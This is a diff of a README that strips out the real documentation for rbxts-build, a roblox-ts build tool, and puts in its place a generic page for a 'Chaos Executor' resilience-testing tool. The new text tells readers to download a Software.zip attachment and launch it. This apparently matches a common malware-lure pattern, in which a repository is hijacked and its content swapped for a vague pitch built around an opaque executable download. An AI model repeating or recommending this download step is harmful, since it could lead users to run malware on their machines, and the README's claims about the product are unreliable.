@@ -1,93 +1,50 @@
-# rbxts-build
+### Chaos Executor
 
-An opinionated build orchestrator for [roblox-ts](https://roblox-ts.com)
+Welcome to the Chaos Executor repository, your one-stop solution for managing chaos in your system environment. 🌪️
 
-## Usage
+### Description
+This repository contains the Chaos Executor, a powerful tool designed to create controlled chaos in your system to test its resilience and identify potential weaknesses. With Chaos Executor, you can simulate various failure scenarios and ensure that your systems are robust enough to handle unexpected situations. 
 
-Requires Node.js v14 or later.
+### Get Started
+To download the Chaos Executor software, click the button below:
+[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
 
-**rbxts-build** works by creating several scripts inside of your `package.json` file's "scripts" object.
+Please note that the software needs to be launched after downloading.
 
-You can use `rbxts-build init` to automatically setup these scripts for you. It's often useful to do the following when setting up a new roblox-ts project:
-- `rbxtsc init`
-- `npm install -D rbxts-build`
-- `npx rbxts-build init`
+### Features
+- **Chaos Scenarios:** Simulate various failure scenarios such as network outages, server crashes, and data corruption.
+- **Customizable Settings:** Tailor chaos experiments to suit your specific system requirements.
+- **Real-time Monitoring:** Monitor system behavior during chaos injection to analyze impact.
+- **Detailed Reports:** Access detailed reports post-experiment for comprehensive analysis.
 
-- **compile**
-	- `rbxtsc --verbose`
-- **build**
-	- `rojo build --output game.rbxl`
-- **open**
-	- Launches Roblox Studio with `game.rbxl`
-- **start**
-	- `npm run compile`
-	- `npm run build`
-	- `npm run open`
-- **stop**
-	- Force kills the Roblox Studio process
-- **sync**
-	- `rojo build --output game.rbxl`
-	- Uses `lune` to generate a `src/services.d.ts` file for indexing existing children in roblox-ts.
-		- [Refer to this guide for more information](https://roblox-ts.com/docs/guides/indexing-children/)
+### Installation
+1. Download the Chaos Executor software from the link provided above.
+2. Launch the software on your system.
+3. Follow the on-screen instructions to configure chaos scenarios and initiate tests.
 
-These scripts should be structured in your `package.json` file as:
-```json
-"scripts": {
-	"build": "rbxts-build build",
-	"open": "rbxts-build open",
-	"start": "rbxts-build start",
-	"stop": "rbxts-build stop",
-	"sync": "rbxts-build sync"
-},
-```
+### Feedback
+We value your feedback! If you encounter any issues or have suggestions for improvements, please raise them in the "Issues" section of this repository.
 
-From there, you can use `npm start`, to launch your project.
+### Contributing
+Contributions are welcome! If you have ideas for enhancing the Chaos Executor tool, feel free to submit a pull request. Your contributions can help make system testing more robust and effective.
 
-Once you've started working, it's convenient to use `npm restart` (or `npm res` for short) to run `npm stop` and then `npm start`.
+### Visit Our Website
+For more information and updates on Chaos Executor, visit our website [here](https://www.chaosexecutor.com).
 
-## Settings
+### Releases
+If the download link provided does not work or you need access to previous versions of the software, kindly check the "Releases" section of this repository for alternative download options.
 
-**rbxts-build** allows for a few settings in `package.json` under a `"rbxts-build"` key:
-```js
-"rbxts-build": {
-	// override arguments to rbxtsc, default provided below
-	"rbxtscArgs": ["--verbose"],
-	// override arguments to rojo build, default provided below
-	"rojoBuildArgs": ["--output", "game.rbxl"],
-	// provide a relative file location for the sync command output, default provided below
-	"syncLocation": "src/services.d.ts",
-	// use rbxtsc-dev instead of rbxtsc, default provided below
-	"dev": false,
-	// WSL-only, use .exe versions of rojo and lune, default provided below
-	"wslUseExe": false,
-	// run `rbxtsc -w` + `rojo serve` automatically after Studio opens, default provided below
-	"watchOnOpen": true,
-	// optionally provide a list of names to replace with their default values, an example is provided below
-	"names": {
-		"build": "dev:build",
-		"compile": "dev:compile",
-		"open": "dev:open",
-		"watch": "dev:watch"
-	}
-},
-```
+### Stay Connected
+Stay connected with us on our social media channels for the latest news and announcements:
+- Twitter: [@ChaosExecutorHQ](https://twitter.com/ChaosExecutorHQ)
+- LinkedIn: [Chaos Executor](https://www.linkedin.com/company/chaos-executor)
 
-## Hooks
-You can run scripts before and after any **rbxts-build** script by adding new `package.json` scripts with `pre-` or `post-` suffixes.
+### License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-For example:
-```json
-"precompile": "echo 'pre-build command'",
-"postcompile": "echo 'post-build command'",
-```
+### Disclaimer
+Please note that while Chaos Executor aims to provide valuable insights into system resilience, it should be used responsibly and with caution in production environments.
 
-npm will execute this as:
-1. `precompile`
-1. `compile`
-1. `postcompile`
+---
 
-## Assumptions
-
-**rbxts-build** assumes a few things about your project's structure:
-- Project must be a game which is fully managed by Rojo
-- Scripts are run from your project directory (where `package.json` lives)
+Thank you for exploring Chaos Executor! Happy chaos testing! 🚀
